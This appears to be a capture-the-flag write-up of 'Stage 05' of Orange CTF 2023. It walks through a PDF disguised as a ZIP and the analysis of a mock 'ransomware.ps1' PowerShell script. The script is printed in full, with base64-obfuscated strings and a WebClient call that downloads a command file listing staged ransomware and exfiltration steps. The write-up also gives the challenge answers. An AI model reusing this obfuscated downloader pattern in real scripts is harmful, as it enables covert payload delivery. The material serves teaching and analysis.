+++
categories = ["all"]
date = 2023-10-28T00:00:00Z
title = "Stage 05"
type = "post"
draft = false
+++

## Stage05

```bash
$ validate part33 PleaseHelpMe
Well done. Now it's time to be better, harder.

Our colleagues investigated on behalf of a customer on a malicious act detected.
They wrote a mini crisis report, but it seems that some words have been erased...
Could this be a malicious act as well?

For my part, I tried to download the file, but it still tells me that it is corrupted...
I don't understand. Yet my colleagues tell me that it is indeed readable !

Download the report : https://ctf.unit41.fr/docs/crisis_report.zip

When you have managed to read this file, and to find the missing information,
could you copy it directly to me in the terminal in the following format:
   word1;word2;word3;word4;word5
I don't think there is any space in the answers, not twice the same answer, and no accent ...
(and yes, send it like a secret command ;))

Thanks a lot for your help !
```

[crisis_report.zip](/writeups/OrangeCTF-2023/Files/crisis_report.zip)

Upon inspecting the file **`crisis_report.zip`**, we initially thought it was a ZIP file. However, upon running the **`file`** command, it was identified as a PDF document:

```bash
$ file crisis_report.zip
crisis_report.zip: PDF document, version 1.7, 4 page(s)
```

We changed the extension to **`.pdf`** and proceeded to read its content. By filling in the gaps through a bit of trial and error, we derived the following string: **`phishing;Cryptolockerv3.symptomatic.exe;192.168.50.104;supprimer;ransomware`**.

[crisis_report.pdf](/writeups/OrangeCTF-2023/Files/crisis_report.pdf)

```bash
$ phishing;Cryptolockerv3.symptomatic.exe;192.168.50.104;supprimer;ransomware
Great ! Your are a brillant analyst !
But a strong analyst know how to analyse a powershell script :).
Do you know it ? Let me check...
Download the file below, and try to understand anything... You can maybe found a suspicious string...

Download the ps1 : https://ctf.unit41.fr/docs/ransomware.ps1

Analyze it, and get the suspicious artefact.
```

This string then led us to the next step of the challenge, where we were prompted to analyze a PowerShell script named **`ransomware.ps1`** available for download.

### ransomware.ps1 file

```powershell
Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName | out-null
Get-CimInstance -ClassName Win32_LogonSession | out-null
function chinese {
 param(
 [parameter( Mandatory = $true, HelpMessage = "Enter a year between 1900 and 2100:" )]
 [ValidateRange(1900,2100)]
 [int]$myYear
 )
 $names = "Rat","Ox","Tiger","Rabbit","Dragon","Snake","Horse","Goat","Monkey","Rooster","Dog","Pig"
 Write-Host $myYear -ForegroundColor White -NoNewline
 if ( $myYear -lt ( Get-Date ).Year ) {
 Write-Host " was" -NoNewline
 } elseif ( $myYear -gt ( Get-Date ).Year ) {
 Write-Host " will be" -NoNewline
 } else {
 Write-Host " is" -NoNewline
 }
 Write-Host " a Chinese year of the " -NoNewline
 Write-Host $names[ ( $myYear - 1900 ) % 12 ] -ForegroundColor White
}
function blober($naz) {
 Get-Service -DisplayName se*
 $bz = "LmZyL0MyQy9jb21tYW5kcy50eHQ"
 Get-CompressedByteArray($byteArray, $bz)
 return $bz
}
function qosdijfopi($x) {
 $a = "aHR0cHM6Ly9jdGYudW5pdDQxLm"
 $b = "ZyL0MyQy9jb21tYW5kcy50eHQ"
 $zd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a+$b))
 (New-Object System.Net.WebClient).DownloadFile($zd, $env:TEMP + "\commands.txt")
}
function x {
 param( [string] $infile = $(throw "Please specify a filename.") )
 $outfile = "$infile.utf8"
 get-content -Path $infile | out-file $outfile -encoding utf8
}
qosdijfopi('Chinese')
function jds($a, $b) {
 Write-Output "Les lignes contiennent : "
 $a+$b+"="
 #$zd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a+$b+"="))
 #return $zd
}
```

The PowerShell script seemed obfuscated, but the challenge instructions hinted that focusing on strings might be important. Indeed, there was a function dedicated to handling strings that caught our attention:

```powershell
function qosdijfopi($x) {
 $a = "aHR0cHM6Ly9jdGYudW5pdDQxLm"
 $b = "ZyL0MyQy9jb21tYW5kcy50eHQ"
 $zd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a+$b))
 (New-Object System.Net.WebClient).DownloadFile($zd, $env:TEMP + "\commands.txt")
}
```

This function seemed to decode a base64 encoded string.

![Untitled](/writeups/OrangeCTF-2023/Files/Untitled%2011.png)

Indeed we got a new file by decoding the base 64 string

### commands.txt file

```text
exec malware.exe
exfiltre *.doc
ask ransom
exit

Yes you are right buddy :)
Now you can validate this part55 !
Try with the password : Anal-Liste
```

Flag : **`validate part55 Anal-Liste`**